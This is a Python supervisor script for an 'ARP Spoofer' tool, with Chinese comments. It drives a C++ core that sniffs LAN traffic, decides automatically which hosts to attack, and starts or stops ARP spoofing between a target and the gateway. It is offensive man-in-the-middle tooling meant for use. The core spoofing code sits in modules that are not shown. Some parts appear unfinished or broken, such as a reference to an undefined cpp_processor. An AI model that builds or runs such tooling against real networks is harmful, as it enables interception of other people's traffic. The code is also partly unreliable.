#!/usr/bin/env python3
"""
ARP Spoofer Python Supervisor v3.0 - C++ Core Integration (Fixed)
=================================================================
职责：
1. 启动和管理C++高性能核心处理器
2. 接收和处理C++核心发送的数据包
3. 提供Web API和监控接口
4. 配置管理和日志记录
5. 统计信息收集和展示

核心处理完全由C++负责，解决GIL限制和锁竞争问题
修复：添加了完整的C++→Python数据包接收器
"""

import time
import threading
import logging
import argparse
import signal
import sys
import yaml
import json
import zmq  # ★ 关键修正：导入ZMQ
from typing import Optional, Dict
from datetime import datetime

# 导入C++核心模块
CPP_MODULE_AVAILABLE = False
USE_FALLBACK = False

try:
    import arp_core_cpp
    print("✅ C++ core module loaded successfully")
    
    # 安全地获取版本信息（如果存在）
    version = getattr(arp_core_cpp, '__version__', 'unknown')
    description = getattr(arp_core_cpp, '__description__', 'ARP Spoofer C++ Core')
    print(f"📦 Module version: {version}")
    print(f"📋 Description: {description}")
    
    # 🔧 调试：列出模块中所有可用的属性
    print("🔍 Available attributes in arp_core_cpp module:")
    module_attrs = [attr for attr in dir(arp_core_cpp) if not attr.startswith('_')]
    for attr in module_attrs:
        attr_type = type(getattr(arp_core_cpp, attr)).__name__
        print(f"  - {attr} ({attr_type})")
    
    # 🔧 检查关键类是否存在
    required_classes = ['ARPSpoofer', 'PacketSniffer']
    missing_classes = []
    
    for cls_name in required_classes:
        if not hasattr(arp_core_cpp, cls_name):
            missing_classes.append(cls_name)
        else:
            print(f"✅ Found {cls_name} class")
    
    if missing_classes:
        print(f"❌ Missing required classes: {missing_classes}")
        print("� Clear build cache and rebuild:")
        print("   cd cpp_core && rm -rf build/ && find . -name '*.so' -delete")
        print("   cd ../scripts && ./build.sh")
        print("\n⚠️ Using Python fallback for now...")
        USE_FALLBACK = True
    else:
        CPP_MODULE_AVAILABLE = True
        
except ImportError as e:
    print(f"❌ Failed to import C++ core module: {e}")
    print("Please build the C++ module first:")
    print("  cd cpp_core && mkdir build && cd build")
    print("  cmake .. && make -j$(nproc)")
    print("  The module should be available as arp_core_cpp.so")
    print("\n⚠️ Falling back to Python implementation...")
    USE_FALLBACK = True

# 导入回退实现
if USE_FALLBACK:
    from python_fallback import PythonARPSpoofer, PythonPacketSniffer
    print("📦 Python fallback implementation loaded")

from config import Config
from packet_analyzer import PacketAnalyzer      # ★ 关键修正：导入分析器
from attack_coordinator import AttackCoordinator  # ★ 关键修正：导入协调器
from state_cache import StateCache              # ★ 关键修正：导入状态缓存

# Web API 可选导入（性能优化：关闭Web功能）
try:
    from web_api import WebAPI
    WEB_API_AVAILABLE = True
except ImportError:
    print("⚠️ Web API module not available (Flask not installed)")
    print("💡 This is expected for performance-optimized deployments")
    WEB_API_AVAILABLE = False
    WebAPI = None

class PythonSupervisor:
    """修正的Python监督者 - 现在包含完整的C++→Python数据桥梁"""
    
    def __init__(self, config: Config):
        self.config = config
        self.running = False
        
        # 首先设置日志
        self._setup_logging()
        
        self.logger.info("🔧 Initializing PythonSupervisor (Fixed Version)...")
        
        # ★ 关键修正：初始化ZMQ上下文和套接字
        self.zmq_context = zmq.Context()
        self.packet_receiver_socket = None
        self.command_sender_socket = None
        self.packet_receiver_thread = None
        self.status_monitor_thread = None  # 添加状态监控线程
        
        # ★ 关键修正：初始化分析和协调组件
        self.state_cache = StateCache()
        self.packet_analyzer = PacketAnalyzer(config)
        self.attack_coordinator = AttackCoordinator(config, self.state_cache)
        
        # C++核心处理器
        self.arp_spoofer = None
        self.packet_sniffer = None
        
        # Web API (如果启用且可用)
        if config.web_api.enabled and WEB_API_AVAILABLE:
            self.web_api = WebAPI(self, config)
        else:
            self.web_api = None
            if config.web_api.enabled and not WEB_API_AVAILABLE:
                self.logger.warning("⚠️ Web API 已配置但不可用 (Flask未安装)")
            else:
                self.logger.info("💡 Web API 已禁用 - 专注核心性能")
        
        # 监控线程
        self.monitor_thread = None
        
        # 统计信息
        self.stats = {
            'start_time': time.time(),
            'python_uptime': 0,
            'last_cpp_stats': None,
            'packets_received': 0,  # ★ 新增：数据包接收统计
            'packets_analyzed': 0,  # ★ 新增：分析统计
            'attacks_triggered': 0  # ★ 新增：攻击触发统计
        }
        
    def _setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='[%(asctime)s] [%(threadName)-20s] [%(levelname)-8s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='a'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        try:
            if USE_FALLBACK:
                self.logger.warning("🔄 Using Python fallback implementation")
            else:
                self.logger.info("🚀 Using high-performance C++ implementation")
            
            # 初始化ARP欺骗器
            interface = self.config.network.interface
            self.logger.info(f"📡 Creating ARPSpoofer with interface: {interface}")
            
            if not USE_FALLBACK:
                self.arp_spoofer = arp_core_cpp.ARPSpoofer(interface)
            else:
                self.arp_spoofer = PythonARPSpoofer(interface)
                
            if not self.arp_spoofer.initialize():
                self.logger.error("❌ Failed to initialize ARP Spoofer")
                return False

            # ★ 关键修正: 初始化数据包嗅探器并传递IPC配置
            self.logger.info(f"📡 Creating PacketSniffer with interface: {interface}")
            
            if not USE_FALLBACK:
                self.packet_sniffer = arp_core_cpp.PacketSniffer(interface)
                # 传递IPC地址给C++组件
                if not self.packet_sniffer.initialize(
                    self.config.ipc.packet_address, 
                    self.config.ipc.command_address
                ):
                    self.logger.error("❌ Failed to initialize packet sniffer with IPC")
                    return False
            else:
                self.packet_sniffer = PythonPacketSniffer(interface)
                if not self.packet_sniffer.initialize():
                    self.logger.error("❌ Failed to initialize packet sniffer")
                    return False

            # ★ ZMQ套接字将在packet_receiver_loop中初始化
            self.logger.info(f"🔌 ZMQ packet stream will connect to: {self.config.ipc.packet_address}")
            
            # 初始化攻击协调器的命令发送器
            self.attack_coordinator.initialize(self.send_command_to_cpp)
            
            self.logger.info("✅ Python Supervisor initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to initialize supervisor: {e}", exc_info=True)
            return False

    def _packet_receiver_loop(self):
        """★ 关键修正: 在专用线程中接收和处理来自C++核心的数据包"""
        self.logger.info("📡 Packet receiver thread started...")
        
        # 连接到C++核心的ZMQ套接字
        try:
            self.packet_receiver_socket = self.zmq_context.socket(zmq.SUB)
            self.packet_receiver_socket.connect(self.config.ipc.packet_address)
            self.packet_receiver_socket.setsockopt(zmq.SUBSCRIBE, b"")  # 订阅所有消息
            self.logger.info(f"📡 Connected to packet stream: {self.config.ipc.packet_address}")
            
            # 初始化命令发送套接字
            self.command_sender_socket = self.zmq_context.socket(zmq.PUSH)
            self.command_sender_socket.connect(self.config.ipc.command_address)
            self.logger.info(f"📤 Connected to command stream: {self.config.ipc.command_address}")
        except Exception as e:
            self.logger.error(f"❌ Failed to connect to ZMQ streams: {e}")
            return
        
        # 统计变量
        last_stats_time = time.time()
        last_packet_count = 0
        
        while self.running:
            try:
                # 使用poll避免永久阻塞
                if self.packet_receiver_socket.poll(timeout=1000):  # 1秒超时
                    # 接收来自C++的JSON字符串
                    packet_json = self.packet_receiver_socket.recv_string()
                    self.stats['packets_received'] += 1
                    
                    # 🔧 每100个包输出一次接收统计
                    current_time = time.time()
                    if current_time - last_stats_time >= 30:  # 每30秒统计一次
                        current_count = self.stats['packets_received']
                        packets_per_sec = (current_count - last_packet_count) / 30
                        self.logger.info(f"📊 ZMQ Reception - Total received: {current_count}, "
                                       f"Rate: {packets_per_sec:.1f} pps, "
                                       f"Analyzed: {self.stats['packets_analyzed']}")
                        last_stats_time = current_time
                        last_packet_count = current_count
                    
                    # 分析数据包
                    analysis_result = self.packet_analyzer.analyze(packet_json)
                    if analysis_result:
                        self.stats['packets_analyzed'] += 1
                        
                        # 交给协调器做决策
                        decision = self.attack_coordinator.make_decision(analysis_result)
                        if decision:
                            if decision.action == 'attack':
                                self.logger.info(f"🎯 开始攻击目标: {decision.target_ip}")
                                self.stats['attacks_triggered'] += 1
                                # 启动攻击
                                self._execute_attack_decision(decision)
                            elif decision.action == 'restore':
                                self.logger.info(f"🔄 恢复网络连接: {decision.target_ip}")
                                # 恢复ARP
                                self._execute_restore_decision(decision)
                else:
                    # 超时，检查是否还有其他工作要做
                    pass
                                
            except zmq.ZMQError as e:
                if e.errno == zmq.ETERM:
                    self.logger.warning("🔌 ZMQ context terminated, exiting receiver loop.")
                    break
                else:
                    self.logger.error(f"❌ ZMQ error in receiver loop: {e}")
            except Exception as e:
                self.logger.error(f"❌ Error in packet receiver loop: {e}", exc_info=True)
        
        # 清理ZMQ套接字
        try:
            if self.packet_receiver_socket:
                self.packet_receiver_socket.close()
            if self.command_sender_socket:
                self.command_sender_socket.close()
        except Exception as e:
            self.logger.error(f"❌ Error closing ZMQ sockets: {e}")
        
        self.logger.info("📡 Packet receiver thread stopped")
        
        self.logger.info("📡 Packet receiver thread stopped.")

    def _execute_attack_decision(self, decision):
        """执行攻击决策"""
        try:
            # 如果 gateway_mac 为空，尝试获取网关 MAC 地址
            gateway_mac = decision.gateway_mac
            if not gateway_mac:
                # 尝试从状态缓存获取网关 MAC
                gateway_mac = self.state_cache.get_cached_mac(decision.gateway_ip)
                if not gateway_mac:
                    # 如果缓存中没有，使用默认值或跳过（在 C++ 中会自动获取）
                    gateway_mac = ""
                    self.logger.debug(f"Gateway MAC not cached for {decision.gateway_ip}, will be resolved in C++")
            
            success = self.arp_spoofer.start_spoofing(
                decision.target_ip,
                decision.gateway_ip,
                decision.target_mac,
                gateway_mac
            )
            if success:
                self.logger.info(f"✅ 攻击已启动: {decision.target_ip}")
            else:
                self.logger.error(f"❌ 攻击启动失败: {decision.target_ip}")
        except Exception as e:
            self.logger.error(f"Error executing attack: {e}", exc_info=True)

    def _execute_restore_decision(self, decision):
        """执行恢复决策"""
        try:
            success = self.arp_spoofer.restore_arp(
                decision.target_ip,
                decision.gateway_ip,
                decision.target_mac,
                decision.gateway_mac
            )
            if success:
                self.logger.info(f"✅ 网络已恢复: {decision.target_ip}")
            else:
                self.logger.error(f"❌ 网络恢复失败: {decision.target_ip}")
        except Exception as e:
            self.logger.error(f"Error executing restore: {e}", exc_info=True)

    def run(self):
        self.running = True
        try:
            # 启动C++数据包捕获
            self.packet_sniffer.start_capture()
            self.logger.info("✅ C++ Packet capture started")

            # ★ 关键修正: 启动Python数据包接收线程
            self.packet_receiver_thread = threading.Thread(
                target=self._packet_receiver_loop, 
                name="PacketReceiver"
            )
            self.packet_receiver_thread.start()
            self.logger.info("✅ Packet receiver thread started")

            # 🔧 启动监控线程
            self._start_monitoring()
            
            # 主循环
            while self.running:
                time.sleep(1)

        except KeyboardInterrupt:
            self.logger.info("🛑 Received interrupt signal...")
        finally:
            self._shutdown()

    def _shutdown(self):
        self.logger.info("🛑 Shutting down Python Supervisor...")
        if not self.running:
            return
        self.running = False

        # 1. 停止所有正在进行的攻击
        if hasattr(self, 'attack_coordinator') and self.attack_coordinator:
            try:
                self.logger.info("🔥 Stopping all active attacks...")
                self.attack_coordinator.stop_all_attacks()
            except Exception as e:
                self.logger.error(f"Error stopping attacks: {e}")

        # 2. 停止数据包嗅探器
        if hasattr(self, 'packet_sniffer') and self.packet_sniffer:
            try:
                self.logger.info("📡 Stopping packet sniffer...")
                self.packet_sniffer.stop_capture()
            except Exception as e:
                self.logger.error(f"Error stopping packet sniffer: {e}")

        # 3. ★ 关键修正: 停止接收线程
        if self.packet_receiver_thread and self.packet_receiver_thread.is_alive():
            self.logger.info("🔄 Waiting for packet receiver thread to stop...")
            self.packet_receiver_thread.join(timeout=3)
            if self.packet_receiver_thread.is_alive():
                self.logger.warning("⚠️ Packet receiver thread did not stop gracefully")

        # 4. 停止状态监控线程
        if hasattr(self, 'status_monitor_thread') and self.status_monitor_thread and self.status_monitor_thread.is_alive():
            self.logger.info("📊 Waiting for status monitor thread to stop...")
            self.status_monitor_thread.join(timeout=2)
            if self.status_monitor_thread.is_alive():
                self.logger.warning("⚠️ Status monitor thread did not stop gracefully")

        # 5. ★ 关键修正: 关闭ZMQ套接字和上下文
        try:
            if self.packet_receiver_socket:
                self.logger.info("🔌 Closing ZMQ packet receiver socket...")
                self.packet_receiver_socket.close()
            if self.command_sender_socket:
                self.logger.info("🔌 Closing ZMQ command sender socket...")
                self.command_sender_socket.close()
            if self.zmq_context:
                self.logger.info("🔌 Terminating ZMQ context...")
                self.zmq_context.term()
        except Exception as e:
            self.logger.error(f"Error closing ZMQ resources: {e}")

        # 6. 停止ARP欺骗器
        if hasattr(self, 'arp_spoofer') and self.arp_spoofer:
            try:
                self.logger.info("🏹 Shutting down ARP spoofer...")
                self.arp_spoofer.shutdown()
            except Exception as e:
                self.logger.error(f"Error shutting down ARP spoofer: {e}")

        # 7. 等待其他监控线程结束
        if hasattr(self, 'monitor_thread') and self.monitor_thread and self.monitor_thread.is_alive():
            self.logger.info("🔍 Waiting for monitor thread to stop...")
            self.monitor_thread.join(timeout=2)
            if self.monitor_thread.is_alive():
                self.logger.warning("⚠️ Monitor thread did not stop gracefully")

        # 8. 停止Web API (如果启用)
        if hasattr(self, 'web_api') and self.web_api:
            try:
                self.logger.info("🌐 Stopping Web API...")
                self.web_api.shutdown()
            except Exception as e:
                self.logger.error(f"Error stopping Web API: {e}")
        
        self.logger.info("✅ Shutdown complete - all components stopped.")

    def get_statistics(self) -> Dict:
        """获取综合统计信息"""
        stats = {
            'python_supervisor': {
                'uptime': time.time() - self.stats['start_time'],
                'status': 'running' if self.running else 'stopped'
            }
        }
        
        if self.cpp_processor:
            try:
                cpp_stats = self.cpp_processor.get_statistics()
                stats['cpp_processor'] = {
                    'packets_captured': cpp_stats.packets_captured,
                    'packets_processed': cpp_stats.packets_processed,
                    'attacks_launched': cpp_stats.attacks_launched,
                    'attacks_successful': cpp_stats.attacks_successful,
                    'processing_rate': cpp_stats.processing_rate,
                    'cache_hit_rate': cpp_stats.hit_rate,
                    'uptime_seconds': cpp_stats.uptime.total_seconds(),
                    'status': 'running' if self.cpp_processor.is_running() else 'stopped'
                }
            except Exception as e:
                stats['cpp_processor'] = {'error': str(e)}
                
        return stats
    
    def shutdown(self):
        """关闭系统 - _shutdown 的别名"""
        self._shutdown()
        
    def _start_monitoring(self):
        """启动监控线程"""
        self.logger.info("🔍 Starting monitoring threads...")
        
        # 启动状态监控线程
        self.status_monitor_thread = threading.Thread(
            target=self._status_monitor_loop,
            name="StatusMonitor"
        )
        self.status_monitor_thread.daemon = True
        self.status_monitor_thread.start()
        self.logger.info("✅ Status monitor started")

    def _status_monitor_loop(self):
        """状态监控循环"""
        last_report = time.time()
        while self.running:
            try:
                current_time = time.time()
                
                # 每60秒输出一次状态
                if current_time - last_report >= 60:
                    total_packets = getattr(self.packet_sniffer, 'get_total_packets', lambda: 0)()
                    filtered_packets = getattr(self.packet_sniffer, 'get_filtered_packets', lambda: 0)()
                    
                    self.logger.info(f"📊 Status - Total packets: {total_packets}, "
                                   f"Filtered: {filtered_packets}, "
                                   f"Active sessions: {len(getattr(self.arp_spoofer, 'get_active_targets', lambda: [])())}")
                    last_report = current_time
                
                time.sleep(5)  # 每5秒检查一次
                
            except Exception as e:
                if self.running:  # 只在运行时记录错误
                    self.logger.warning(f"Status monitor error: {e}")
                time.sleep(10)

    def send_command_to_cpp(self, command_dict) -> bool:
        """发送命令到C++核心"""
        try:
            if not self.command_sender_socket:
                self.logger.error("❌ Command sender socket not initialized")
                return False
            
            # 将命令序列化为JSON
            command_json = json.dumps(command_dict)
            
            # 发送命令
            self.command_sender_socket.send_string(command_json, zmq.NOBLOCK)
            return True
            
        except zmq.Again:
            self.logger.warning("⚠️ Command send buffer full, command dropped")
            return False
        except Exception as e:
            self.logger.error(f"❌ Error sending command: {e}")
            return False

def parse_arguments():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
    parser.add_argument('-c', '--config', default='config.yaml',
                       help='Configuration file path')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       help='Log level (overrides config file)')
    parser.add_argument('--web-api', action='store_true',
                       help='Enable web API interface')
    parser.add_argument('--web-port', type=int,
                       help='Web API port (overrides config file)')
    # 新增网络配置参数
    parser.add_argument('--interface', 
                       help='Network interface (overrides config file)')
    parser.add_argument('--gateway-ip',
                       help='Gateway IP address (overrides config file)')
    
    return parser.parse_args()

def signal_handler(signum, frame):
    """信号处理器 - 优雅关闭所有组件"""
    print(f"\nReceived signal {signum}, shutting down gracefully...")
    
    # 全局访问监督者实例以便优雅关闭
    if hasattr(signal_handler, 'supervisor') and signal_handler.supervisor:
        signal_handler.supervisor.shutdown()
    
    print("✅ Graceful shutdown completed.")
    sys.exit(0)

def main():
    """主函数"""
    try:
        # 解析命令行参数
        args = parse_arguments()
        
        # 设置信号处理
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
        # 🔧 优先级：默认值 < YAML配置文件 < 命令行参数
        # 加载配置（第一步：YAML文件 - 主要配置来源）
        config = Config.load_from_file(args.config)
        print(f"📋 Loaded config from: {args.config}")
        
        # 命令行参数覆盖（第二步：仅在明确指定时覆盖YAML）
        overrides = []
        if args.log_level:
            config.logging.level = args.log_level
            overrides.append(f"log_level={args.log_level}")
        if args.web_api:
            config.web_api.enabled = True
            overrides.append("web_api=enabled")
        if args.web_port:
            config.web_api.port = args.web_port
            overrides.append(f"web_port={args.web_port}")
        if args.interface:
            config.network.interface = args.interface
            overrides.append(f"interface={args.interface}")
        if args.gateway_ip:
            config.network.gateway_ip = args.gateway_ip
            overrides.append(f"gateway_ip={args.gateway_ip}")
            
        # 显示配置优先级信息
        if overrides:
            print(f"🔧 Command line overrides: {', '.join(overrides)}")
        else:
            print("✅ Using pure YAML configuration (no command line overrides)")
            
        # 打印最终使用的关键配置
        impl_mode = "C++ High Performance" if CPP_MODULE_AVAILABLE and not USE_FALLBACK else "Python Fallback"
        print(f"📋 Implementation: {impl_mode}")
        print(f"📋 Final config - Interface: {config.network.interface}, Gateway: {config.network.gateway_ip}")
        print(f"📋 Performance - Threads: {config.performance.max_worker_threads}, Attack freq: {getattr(config.attack, 'attack_frequency', 'default')}")
        
        # 创建并运行监督者
        print("🔧 Creating PythonSupervisor...")
        supervisor = PythonSupervisor(config)
        
        # 将监督者实例传递给信号处理器
        signal_handler.supervisor = supervisor
        
        print("🔧 Initializing supervisor...")
        if supervisor.initialize():
            print("🚀 Running supervisor...")
            
            # 🔧 添加测试攻击（可选）
            # 在生产环境中，攻击目标应该通过API或配置文件指定
            # supervisor.start_attack("192.168.1.100")  # 示例攻击目标
            
            supervisor.run()
        else:
            print("❌ Failed to initialize supervisor")
            sys.exit(1)
            
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
